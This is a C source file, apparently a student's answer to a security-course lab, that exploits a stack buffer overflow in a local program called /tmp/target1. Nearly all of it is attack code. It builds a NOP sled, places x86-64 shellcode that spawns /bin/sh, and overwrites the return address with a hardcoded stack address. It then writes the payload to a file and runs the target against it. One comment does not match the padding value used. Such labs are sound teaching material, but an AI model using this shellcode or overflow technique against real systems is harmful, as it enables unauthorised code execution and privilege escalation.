#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include "shellcode.h"
#include "write_xploit.h"
#include <stdint.h>

#define TARGET "/tmp/target1"
#define DEFAULT_OUTPUT "/tmp/xploit1_output"

int main(int argc, char *argv[])
{

  char exploit[264+8];
  memset(exploit, 0x90, sizeof(exploit));
  const unsigned char shellcode[] =
"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

  // 1. 使用 NOP 填充到返回地址位置
  // 计算需要填充的字节数：总大小 - shellcode大小 - 返回地址大小
  size_t shellcode_size = sizeof(shellcode) - 1;
  size_t padding_size = 200;  // 8是返回地址大小（64位）
  
  // 2. 把 shellcode 放到 NOP 后面
  memcpy(exploit + padding_size, shellcode, shellcode_size);

  // 直接逐字节赋值，比 memset 更清晰
char *addr_ptr = exploit + sizeof(exploit) - 8;

addr_ptr[0] = 0x23;
// addr_ptr[0] = 0x60;
addr_ptr[1] = 0xdc;
addr_ptr[2] = 0xff;
addr_ptr[3] = 0xff;
addr_ptr[4] = 0xff;
addr_ptr[5] = 0x7f;
addr_ptr[6] = 0x00;




  // TODO fill exploit buffer

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed.");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}

